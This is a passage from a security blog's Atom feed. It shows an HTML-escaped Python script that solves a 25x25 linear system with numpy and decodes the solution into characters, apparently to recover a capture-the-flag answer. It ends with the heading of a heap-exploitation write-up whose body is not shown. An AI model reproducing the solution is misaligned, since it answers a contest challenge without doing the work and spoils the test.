&lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;199&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;162&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;227&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;126&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;43&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;224&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;69&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;70&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;155&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;132&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;89&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;201&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;101&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;215&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;139&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;126&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;119&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;17&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;158&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;227&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;76&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;80&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;110&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;231&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;109&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;209&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;239&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;163&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;160&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;190&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;199&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;225&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;244&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;208&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;220&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;248&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;120&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;151&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;173&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;104&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;148&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;54&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;218&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;57&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;115&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;190&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;34&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;140&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;52&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;160&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;34&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;201&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;33&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;183&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;224&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;99&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;243&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;246&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;161&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;146&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;43&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;41&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;174&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;146&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;202&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;90&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;254&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;216&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;113&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;114&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;158&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;116&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;69&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;155&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;146&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;170&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;135&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;161&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;249&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;251&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;96&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;103&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;33&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;39&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;230&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;166&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;254&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;234&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;113&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;250&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;89&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;135&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;119&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;192&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;206&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;73&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;92&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;174&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;164&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;95&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;254&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;163&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;206&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;51&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;196&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;106&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;252&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;202&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;146&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;118&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;168&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;102&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;207&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;154&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;131&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;185&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;162&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;248&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;129&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;170&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;181&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;96&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;41&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;169&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;120&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;93&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;89&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;164&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;228&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;175&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;164&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;176&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;47&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;119&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;147&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;248&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;49&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;39&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;215&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;101&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;215&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;226&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;118&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;87&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;54&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;239&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;49&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;220&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;216&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;114&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;51&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;198&lt;/span&gt;]]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r = [&lt;span class=&quot;number&quot;&gt;325799&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;309234&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;317320&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;327895&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;298316&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;301249&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;330242&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;289290&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;273446&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;337687&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;258725&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;267444&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;373557&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;322237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;344478&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;362136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;331815&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;315157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;299242&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;305418&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;313569&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;269307&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;338319&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;306491&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;351259&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;o = np.array(o)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r = np.array(r)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;x = np.linalg.solve(o,r)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; x&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;string = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; x:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    string += chr(int(str(i)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;]))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; string&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】cuit2017 &amp; 0ctf2017 heap总结</title>
    <link href="https://winter3un.github.io/2017/06/04/heap-all/"/>
    <id>https://winter3un.github.io/2017/06/04/heap-all/</id>
    <published>2017-06-04T15:59:24.000Z</published>
    <updated>2017-06-04T16:15:22.000Z</updated>
    
